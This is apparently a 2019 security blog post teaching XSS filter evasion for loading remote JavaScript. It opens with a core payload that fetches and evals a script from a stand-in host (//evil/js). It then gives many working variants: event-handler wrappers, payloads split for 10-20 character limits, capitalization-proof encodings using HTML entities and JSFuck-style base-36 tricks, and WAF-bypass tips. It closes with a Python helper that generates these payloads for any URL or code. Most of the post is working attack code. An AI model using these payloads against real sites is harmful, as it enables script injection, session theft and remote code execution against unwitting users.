##
#
https://aayla-secura.github.io/xss-fetch-evasion
#
##

XSS evasion techniques to fetch an external resource
 Feb 23, 2019
So you popped that sweet alert(1) and now want to do something that’s actually useful, but the input is being truncated to 15 characters? Or maybe your input is being capitalized? Let’s look at some ways to go around it.

The payload
In this post I’ll only look at fetching an external resource, rather than doing anything fancy within the inline XSS. Obviously this won’t always work if the target is behind an egress firewall.

For example purposes the malicious JavaScript is at //evil/js. The payload, in a nutshell is:

fetch('//evil/js').then(r=>r.text().then(eval))
Table of Contents
Encodings marked with :four_leaf_clover: can be easily customized for arbitrary payloads using either the fetch_helpers.py script in the Appendix, or by trivial editting.

First things first
Event handlers
Dealing with limited space
Usecase: character limit is >= 20 (not including wrapping)
Usecase: character limit is >= 13 (not including wrapping)
:four_leaf_clover:Usecase: character limit is >= 10
How to modify it
Dealing with capitalization
:four_leaf_clover:Usecase: payload is being capitalized, character limit >= 131 (not including wrapping and length of external resource URL)
Explanation
:four_leaf_clover:Usecase: payload is being capitalized, character limit > ~342 (not including wrapping, may vary depending on external resource URL)
Explanation (with comments)
How to modify it
Usecase: payload is being capitalized, character limit >= 10
Appendix: Helper script
References and further reading
First things first
Some of the payloads described below are already wrapped in HTML which puts the payload in JavaScript context, but you can of course change the HTML element used. Other payloads need wrapping, as indicated for each. Possible ways to execute a payload are:

If injection ends up outside of an HTML tag:
<script>payload</script>
<svg/onload="payload"/>
<img/onerror="payload"/src=x>
<style/onload="payload"></style>
<input/onfocus="payload"/autofocus>
<marquee/onstart="payload"></marquee>
<div/onwheel="payload"/style="height:200%;width:100%"></div>
<div/onmouseover="payload"/style="height:100%;width:100%"></div>
… many more, see below table for event attributes and supported tags
If injection ends up inside an HTML tag’s attribute:
" event="payload
' event='payload (replace single quotes in payload with double quotes)
Event handlers
Possible events and the supported HTML tags are:

event	supported HTML tags
onload	body, frame, frameset, iframe, img, input type=”image”, link, script, style
onchange	input type=”checkbox”, input type=”file”, input type=”password”, input type=”radio”, input type=”range”, input type=”search”, input type=”text”, select, textarea
onkeyup	all except base, bdo, br, head, html, iframe, meta, param, script, style, title
onmouseover	—“—
onblur	—“—
onfocus	—“—
onclick	—“—
onmouseover	—“—
onmouseout	—“—
oncontextmenu	all, but it can only be triggered if the element has a non-zero size on the page, and is not covered by other elements
onwheel	—“—
ondrag	—“—
ondrop	—“—
oncopy	—“—
oncut	—“—
onpaste	—“—
onscroll	address, blockquote, body, caption, center, dd, dir, div, dl, dt, fieldset, form, h1—h6, html, li, menu, object, ol, p, pre, select, tbody, textarea, tfoot, thead, ul
oninvalid	input
oninput	input type=”password”, input type=”search”, input type=”text”, textarea
onsearch	input type=”search”
onselect	input type=”file”, input type=”password”, input type=”text”, textarea
onreset	form
onsubmit	form
NOTE

Some WAFs block only some html tags (e.g. <script>), but not other tags, so don’t give up after trying a few that got rejected.
Some WAFs do a poor job and fail to block HTML tags or attributes when they are capitalized (or mixed case). Give that a try.
Many event handlers require user action. See more at https://www.w3schools.com/TAGS/ev_event.asp
Dealing with limited space
The below usecases are for character limit that doesn’t allow the full payload in a single injection. Each line is a separate payload that requires wrapping to put it in a JS context (e.g. <script>payload</script>).

Usecase: character limit is >= 20 (not including wrapping)
Payloads order on the page doesn’t matter.
T=(o,f)=>o.then(f)
X=eval
Y='//evil/js'
Z=r=>T(r.text(),X)
J=_=>T(fetch(Y),Z)
setTimeout(_=>J(),9)
Usecase: character limit is >= 13 (not including wrapping)
Payloads order on page does matter.
p=Promise
P=p.prototype
t=P.then
tc=t.call
T=tc.bind(t)
r=Response
R=r.prototype
z=R.text
zc=z.call
Z=zc.bind(z)
E=eval
j='//evil/js'
J=fetch(j)
T(T(J,Z),E)
Usecase: character limit is >= 10
Works with arbitrary payloads
No additional wrapping needed
<script> must not be blocked and must not appear between the payloads
Payloads order on page does matter.
<script>/*
*/X="f"+/*
*/"etc"+/*
*/"h('"+/*
*/"//e"+/*
*/"vil"+/*
*/"/js"+/*
*/"')."+/*
*/"the"+/*
*/"n(r"+/*
*/"=>r"+/*
*/".te"+/*
*/"xt("+/*
*/").t"+/*
*/"hen"+/*
*/"(ev"+/*
*/"al)"+/*
*/"))"/*
*/;eval/*
*/(X);
</script>
How to modify it
Replace the encoded payload above with the output from:

python2 fetch_helpers.py -x '//myown/external/js' -e split_to_len --maxLen 10
Note: You can give it an arbitrary payload using the -p option. You can also adjust the maximum length. See python2 fetch_helpers.py --help for more options.

Dealing with capitalization
Usecase: payload is being capitalized, character limit >= 131 (not including wrapping and length of external resource URL)
Works with arbitrary payloads
Needs wrapping; <script>payload</script> won’t work—use event handlers
X="FETCH(\"//EVIL/JS\").THEN(R=>R.TEXT().THEN(EVAL))";&#X65;&#X76;&#X61;&#X6C;(X.&#X74;&#X6F;L&#X6F;&#X77;&#X65;&#X72;C&#X61;&#X73;&#X65;())
Explanation
The second part of the payload is eval(X.toLowerCase()).

Note: <script> doesn’t work here, because the HTML characters won’t be interpreted. Payload must be in an event handler. For example:

<SVG/ONLOAD='X="FETCH(\"//EVIL/JS\").THEN(R=>R.TEXT().THEN(EVAL))";&#X65;&#X76;&#X61;&#X6C;(X.&#X74;&#X6F;L&#X6F;&#X77;&#X65;&#X72;C&#X61;&#X73;&#X65;())'/>
Usecase: payload is being capitalized, character limit > ~342 (not including wrapping, may vary depending on external resource URL)
Works with arbitrary payloads
X can be any function that doesn’t involve lowercase letters. Some examples are:
URL and $: don’t work inside event handlers
USB and CSS: don’t have good cross-browser support
[][F[0]+(1/0+[])[3]+F[2]+F[2]] used below, where F is “false”, gives []["fill"], i.e. Array.prototype.fill: works in all browsers and in all places
T=!0+[];F=!1+[];X=[][F[0]+(1/0+[])[3]+F[2]+F[2]];Y=X+[];S=F[3]+F[2]+Y[5]+Y[3]+F[4];C=Y[3]+Y[S](6,8)+F[3]+T[S](0,3)+Y[S](3,5)+Y[6]+T[1];N=C[S](8,10)+(""[C]+[])[S](9,15);(X[C](25885457[N](36)+"('//"+694029[N](36)+"/"+712[N](36)+"')."+1375583[N](36)+"("+27[N](36)+"=>"+27[N](36)+"."+1372385[N](36)+"()."+1375583[N](36)+"("+693741[N](36)+"))"))()
Explanation (with comments)
T=!0+[]; // "true"
F=!1+[]; // "false"
// I=1/0+[]; // "Infinity"
X=[][F[0]+(1/0+[])[3]+F[2]+F[2]]; // []["fill"], i.e.
                                  // Array.prototype.fill
Y=X+[]; // "function ...", to get letters "c" and "o"
S=F[3]+F[2]+Y[5]+Y[3]+F[4]; // S="slice"
C=Y[3]+Y[S](6,8)+F[3]+T[S](0,3)+Y[S](3,5)+Y[6]+T[1];
                                  // C="constructor"
N=C[S](8,10)+(""[C]+[])[S](9,15); // N="toString";
                                  // <number>["toString"](36)
                                  // can give any number or
                                  // lowercase letter as string
J=25885457[N](36) // "fetch"
+"('//"
+694029[N](36) // "evil"
+"/"
+712[N](36) // "js"
+"')."
+1375583[N](36) // "then"
+"("
+27[N](36) // "r"
+"=>"
+27[N](36) // "r"
+"."
+1372385[N](36) // "text"
+"()."
+1375583[N](36) // "then"
+"("
+693741[N](36) // "eval"
+"))";
(X[C](J))(); // X[C] is Array.prototype.fill["constructor"],
             // i.e. Function.prototype. It creates an
             // anonymous function with J as the body, which
             // is then executed
How to modify it
Replace the encoded payload above, in (X[C](encoded payload))(), with the output from:

python2 fetch_helpers.py -x '//myown/external/js' -e num_to_string --toString N
Note: You can give it an arbitrary payload using the -p option. See python2 fetch_helpers.py --help for more options.

Usecase: payload is being capitalized, character limit >= 10
Works with arbitrary payloads
No additional wrapping needed
<script> must not be blocked
Payloads order on page does matter.
Payload is the same as the one above. Split here to 10 characters for completeness.

TO DO: Encoder in fetch_helpers.py to split this to arbitrary length.

<SCRIPT>/*
*/T=!0/*
*/+[];/*
*/F=!1/*
*/+[];/*
*/I=1/0/*
*/+[];/*
*/X=/*
*/F[0]+/*
*/I[3]+/*
*/F[2]+/*
*/F[2];/*
*/X=[]/*
*/[X];/*
*/Y=/*
*/X+[];/*
*/C=/*
*/Y[3]+/*
*/Y[6]+/*
*/Y[7]+/*
*/F[3]+/*
*/T[0]+/*
*/T[1]+/*
*/T[2]+/*
*/Y[3]+/*
*/Y[4]+/*
*/Y[6]+/*
*/T[1];/*
*/S=""/*
*/[C]/*
*/+[];/*
*/N=/*
*/C[8]+/*
*/C[9]+/*
*/S[9]+/*
*/S[10]+/*
*/S[11]+/*
*/S[12]+/*
*/S[13]+/*
*/S[14];/*
*/Q=/*
*/X[C];/*
*/R=A=>/*
*/Q(A);/*
*/O=A=>/*
*/A[N]/*
*/(36);/*
*/V=2588/*
*/*10000/*
*/+5457/*
*/J=O(V)/*
*/J+=/*
*/"('//"/*
*/V=/*
*/694029/*
*/J+=/*
*/O(V);/*
*/J+=/*
*/"/";/*
*/J+=/*
*/O(712)/*
*/J+=/*
*/"')."/*
*/W=1375/*
*/*1000/*
*/+583/*
*/J+=/*
*/O(W)/*
*/J+=/*
*/"("/*
*/J+=/*
*/O(27)/*
*/J+=/*
*/"=>"/*
*/J+=/*
*/O(27)/*
*/J+=/*
*/"."/*
*/V=W-/*
*/3198/*
*/J+=/*
*/O(V)/*
*/J+=/*
*/"()."/*
*/J+=/*
*/O(W)/*
*/J+=/*
*/"("/*
*/V=/*
*/693741/*
*/J+=/*
*/O(V)/*
*/J+=/*
*/"))";(/*
*/R(J))/*
*/();
</SCRIPT>
Appendix: Helper script
Use this script to generate some of the above types of payloads, but with the URL of your external resource to fetch. You can also adjust the character limit. This blog post assumes it’s called fetch_helpers.py.

The script may have been updated, check the latest version.

#!/usr/bin/env python2

import sys
import argparse
import string
import logging
import re

BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)

class ColorFormatter(logging.Formatter):
    COLORS = {
        'DEBUG'    : BLUE,
        'INFO'     : WHITE,
        'WARNING'  : YELLOW,
        'ERROR'    : RED,
        'CRITICAL' : RED,
    }
    def format(self, record):
        return '\x1b[1;3%dm%s\x1b[0m' % (
                self.COLORS[record.levelname],
                logging.Formatter.format(self,record))

MAX_JS_INT = 9007199254740991 # Number.MIN_SAFE_INTEGER

class Payload:
    def __init__(self, raw, to_string):
        self.raw = raw
        self.to_string = to_string
    
    def __len__(self):
        return len(self.raw)
    
    def __str__(self):
        return self.raw
    
    def append(self, payload):
        self.raw += payload
    
    def prepend(self, payload):
        self.raw = payload + self.raw
    
    def as_split_to_len(self, quote, max_len, **kwargs):
        if max_len < 10:
            # need to fit at least */eval/*
            logger.error("This encoding requires at least 10 characters per line")
            return ''
        
        logger.warn("This encoding won't work if the content between any of the separate split payloads contains multiline comments /* ... */")
        prefix = '*/'
        suffix = '/*'
        dummy_var = 'X'
        comment = suffix + '\n' + prefix
        sep = quote + '+' + comment + quote
        setup_prefix = comment.join(split_to_len(
            '<script>%s=' % dummy_var, count=max_len-len(suffix)))
        left_at_last_line = max_len - len(setup_prefix.rsplit('\n',1)[-1])
        
        # padding to take into account any content on the line between
        # the prefix and the start of the payload
        padding = '?' * (max_len - left_at_last_line - len(prefix))
        
        # if there's no space for at least "<letter>"+/*, just start
        # on the next line
        if left_at_last_line < 6:
            setup_prefix = setup_prefix + comment
            padding = ''
        
        payload = self.raw.replace(quote,'\\'+quote)
        logger.debug('Splitting %s' % payload)
        # hold on to the last character of payload
        # since there will be no + at the end
        # len(sep)+1 is to compensate for the newline
        lines = split_to_len(padding+payload[:-1], count=max_len-len(sep)+1)
        lines[0] = lines[0][len(padding):]
        lines[-1] = lines[-1] + payload[-1]
        
        # there is always space for the ; at the end, since it takes
        # the place of the + on previous lines
        encoded = '%s%s%s%s' % (setup_prefix, quote,
                sep.join(lines), quote)
        lines = encoded.rsplit('\n',1)
        
        # setup_suffixes[0] will be added to the last line, split
        # to max_len and joined with a comment
        # setup_suffixes[1], if present, will be joined at the end
        # with a newline
        if max_len == 10:
            # if there is no space for */</script> we'll end the
            # last line with a semicolon instead of /*
            # there will be JavaScript errors due to random content on
            # the page between the last two payload chunks
            setup_suffixes = [';eval(%s);' % dummy_var, '</script>']
        else:
            # otherwise split the whole suffix and put comments
            # between each chunk
            setup_suffixes = [';eval(%s)</script>' % dummy_var]
        
        # hold on to the last two characters of setup_suffixes[0]
        # and the first two characters of lines[-1]
        # since there will be no /* at the end and no extra */ at the
        # beginning
        # len(comment)+1 is to compensate for the newline
        to_add = split_to_len(lines[-1][2:]+setup_suffixes[0][:-2],
            count=max_len-len(comment)+1,
            no_split_on='(\\\\.|eval|\(%s(?:\)|$)|</[a-z]+)' % dummy_var)
        to_add[0] = lines[-1][:2] + to_add[0]
        to_add[-1] = to_add[-1] + setup_suffixes[0][-2:]
        
        encoded = '\n'.join(lines[:-1] + \
                [comment.join(to_add)] + setup_suffixes[1:])
        
        return encoded
    
    def as_num_to_string(self, quote, max_int, **kwargs):
        left = self.raw
        encoded = ''
        warned = False
        while left:
            logger.debug('Next: "%s"' % left)
            num, left, unsupp = str_to_dec(left, max_int)
            if num >= 0:
                encoded += '%u[%s](36)+' % (num, self.to_string)
            if unsupp:
                encoded += '%s%s%s+' % (quote,
                    unsupp.replace(quote,'\\'+quote), quote)
                if not warned:
                    logger.warning('This encoding supports lowercase ' +
                        'letters and digits only. Rest of characters will ' +
                        'be added literally')
                    warned = True
        
        encoded = encoded[:-1] # strip trailing "+"
        return encoded

def split_to_len(payload, count=None, no_split_on='(\\\\.)'):
    '''
    payload is to be split at count number of characters but never
    within at atomic group defined by no_split_on
    no_split_on is a regex of groups of characters which should be kept
    together
      - it must have exactly one capturing group
      - it doesn't make sense for it to be able to match more than
        count characters
    returns an array of strings, no longer than count
    '''
    
    if count is None:
        count = len(payload)
    flatten = lambda z: [x for y in z for x in y]
    lines = re.split(no_split_on,payload)
    # even indexed elements of lines are the ones that match
    # no_split_on; leave them as they are; split the odd ones
    return list(get_next_split_chunk(lines, count))

def get_next_split_chunk(payloads, count):
    '''
    payloads is an array whose even indexed elements are atomic
    (cannot be split) and odd ones should be split at count number of
    characters
    yields a string, no longer than count
    '''
    curr = ''
    can_split = True # True when to_add is odd indexed
    for to_add in payloads:
        while True:
            if not to_add:
                break
            if len(curr) >= count:
                yield curr
                curr = ''
                continue
            if can_split or len(curr+to_add) <= count:
                curr, to_add = (curr+to_add)[:count],(curr+to_add)[count:]
            else:
                yield curr
                curr = to_add
                break
        can_split = not can_split
    if curr:
        yield curr

def split_to_len_simple(payload, count=None):
    if count is None:
        count=len(payload)
    return filter(None,re.findall('(.{,%u})' % count, payload))

def str_to_dec(payload, max_int):
    '''
    Returns a tuple: num, todo, removed
      num["toString"](36) gives a string from the beginning of payload
            until removed+todo; if there was an usupported character
            at the beginning num will be -1
      if we stopped becuase of unsupported characters, removed
      contains all such characters
      todo is the rest of the string after initial unsupported
            characters are removed
    '''
    
    supp_chars = string.lowercase+string.digits
    num = 0
    if payload[0] not in supp_chars:
        num = -1
    pos = 0
    err = False
    for c in payload:
        if c not in supp_chars:
            err = True
            break
        
        new_num = num*36 + (ord(c)-87 if c in string.lowercase else int(c))
        
        logger.debug('pos=%u, num=%u' % (pos,new_num))
        if new_num > max_int:
            logger.debug(
                'JS integer would overflow, ' +
                'string truncated to "%s"' % payload[0:pos])
            break
        
        pos = pos + 1
        num = new_num
    
    left = payload[pos:]
    todo = left.lstrip(left.translate(None, supp_chars))
    removed = left.replace(todo,'')
    
    return num, todo, removed


if __name__ == "__main__":
    logger = logging.getLogger('XSS Payloads')
    log_handler = logging.StreamHandler()
    log_handler.setFormatter(ColorFormatter('%(levelname)s: %(message)s'))
    logger.addHandler(log_handler)
    
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        argument_default=argparse.SUPPRESS,
        description='''XSS payloads for edge cases (limited number of
        characters, capitalised payloads, more to come...). Default
        payload fetches and external script. Arbitrary payloads are
        supported.''')
    parser.add_argument('-p', '--payload', dest='payload',
        default="fetch('%%SCRIPT%%').then(r=>r.text().then(eval)))",
        metavar='STRING', help='''Raw payload. %%SCRIPT%% will be
        replaced with the URL of the external script.''')
    parser.add_argument('-x', '--script', dest='script',
        default="//evil/js", metavar='STRING',
        help='''URL for the external script''')
    parser.add_argument('-e', '--encoding', dest='encoding',
        default='num_to_string', metavar='NAME',
        choices=['num_to_string', 'split_to_len'],
        help='''Type of payload encoding. More types to come
        soon...''')
    parser.add_argument('--singleQ', dest='quote',
        default='"', action='store_const', const="'",
        help='''Use single quotes for concatenating.''')
    parser.add_argument('-d','--debug', dest='loglevel',
        default=logging.INFO, action='store_const',
        const=logging.DEBUG,
        help='''Be very verbose.''')
    parser.add_argument('--toString', dest='to_string',
        default='toString', metavar='STRING',
        help='''String to use instead of "toString" when
        encoding payload as <num>["toString"](36).''')
    parser.add_argument('--maxLen', dest='max_len',
        default=15, metavar='NUMBER', type=int,
        help='''Maximum length to use when
        splitting payload.''')
    parser.add_argument('--maxInt', dest='max_int',
        default=MAX_JS_INT, metavar='NUMBER', type=int,
        help='''Maximum integer to use when
        encoding payload as <num>["toString"](36).''')
    args = parser.parse_args()
    
    logger.setLevel(args.loglevel)
    
    p = Payload(args.payload.replace('%%SCRIPT%%', args.script),
            args.to_string)
    
    print '%s' % getattr(p, 'as_'+args.encoding)(**vars(args))
References and further reading
The Dealing with capitalization solution was inspired by JSFuck. In comparison it allows a lot more characters (all except lowercase letters). Consequently it’s a lot less verbose than JSFuck.
